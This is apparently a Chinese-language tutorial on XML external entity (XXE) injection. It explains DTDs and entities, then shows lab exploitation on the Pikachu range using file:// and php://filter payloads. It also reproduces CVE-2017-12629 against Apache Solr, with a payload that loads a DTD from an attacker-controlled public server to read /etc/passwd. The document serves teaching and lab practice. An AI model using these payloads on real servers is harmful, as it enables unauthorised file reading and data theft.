# XXE

XXE -"xml external entity injection"既"xml外部实体注入漏洞"。

**概括一下就是"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题"也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。导致可加载恶意外部文件
和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。**

现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。

### DTD文件

DTD Document Type Definition
文档类型定义。我们在XML中可以自定义标记，那[XML解析器](https://baike.baidu.com/item/XML%E8%A7%A3%E6%9E%90%E5%99%A8/2673664)怎么认识这些自定义标记并根据自定义标记的处理法则来处理元素呢？这需要[DTD](https://baike.baidu.com/item/DTD/2661276)，它是我们用来定义我们自己定义的标记的含义，我们自己定义元素的相关属性的文档。

#### PCDATA

意思是被解析的字符数据。PCDATA（Parsed Character data）是会被解析器解析的文本。这些文本将被解析器检查实体
以及标记。文本中的标签会被当作标记来处理，而实体会被展开。

#### CDATA

意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对 待，其中的实体也不会被展开。

用来约束xml 的自定义的语法规则

![image-20220301135430258.png](https://image.3001.net/images/20220707/1657185506_62c6a4e23190cb5745048.png!small)  
 **ENTITY/ENTITIES 实体定义**

用于为一段内容创建一个别名，以后再xml文档中就可以使用别名引用这段内容在DTD定义中，一条语句用于定义一个实体

 **实体可以分为两种类型**  
 **引用实体** 和 **参数实体**  
引用实体  
1.在DTD中定义

    
    
    <!ENTITY 实体名 内容>
    　　例子<!ENTITY sto "个人介绍">
    

2.在xml引用 &实体名  
例子： &ampsto （引用符号 & 和结束分号；必须有）

# 案例展示

## pikachu靶场 xxe

### 读文件方式

#### file://

本地存在 d://test.txt ， File协议读文件

 **payload**

    
    
    <?xml version = "1.0"?> <!DOCTYPE ANY [ <!ENTITY xxe SYSTEM "file:///d://test.txt"> ]> <x>&ampxxe</x>
    

![image-20220707155318469.png](https://image.3001.net/images/20220707/1657185614_62c6a54e4d05999e4b25f.png!small)

放包后

![image-20220707160444230.png](https://image.3001.net/images/20220707/1657185639_62c6a567770395ca27ca0.png!small)

#### php://filter

查看php源代码，File协议不行，我们要用php://filter。

php://filter是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。

php://filter目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。

适用如下payload读取php文件，就会获得一串base64加密过的指定php源码文件

    
    
    <?xml version="1.0"?> 
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=D:/phpStudy/PHPTutorial/WWW/pikachu-master/vul/xxe/xxe.php" > ]> 
    <foo>&ampxxe</foo>
    

![image-20220707161209833.png](https://image.3001.net/images/20220707/1657185676_62c6a58c12fcf0dba9e16.png!small)

解码一下就是php文件内容了 https://base64.us/

![image-20220707161420552.png](https://image.3001.net/images/20220707/1657185686_62c6a596243ae10b03226.png!small)

## CVE-2017-12629-XXE 复现

[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020)Solr
是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene
实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过
http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。

![image-20220707165557484.png](https://image.3001.net/images/20220707/1657185713_62c6a5b17c00ad62f8ea6.png!small)

使用编码命令，改好自己的公网服务器ip，并创建do.dtd

payload

    
    
    /solr/demo/select?&q=<?xml+version="1.0"+?><!DOCTYPE+root[<!ENTITY+%+ext+SYSTEM+“http://ip(你的公网服务器ip)/do.dtd”>%ext;%ent;]>&ampdata&wt=xml&defType=xmlparser
    

xml原型

    
    
    <?xml version="1.0" ?>
    <!DOCTYPE root[
    <!ENTITY % ext SYSTEM "http://ip/do.dtd">
    %ext;%ent;]>
    <r>&ampdata</r>
    

公网服务器dtd文件，读/etc/passwd

![image-20220707165808311.png](https://image.3001.net/images/20220707/1657185743_62c6a5cf946fbfd52837d.png!small)

    
    
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
    

执行之后对方服务器就会来找我们服务器的dtd文件

结果如下

![image-20220707170222181.png](https://image.3001.net/images/20220707/1657185754_62c6a5dab51e639f92f5a.png!small)  
成功读到对方服务器上的/etc/passwd

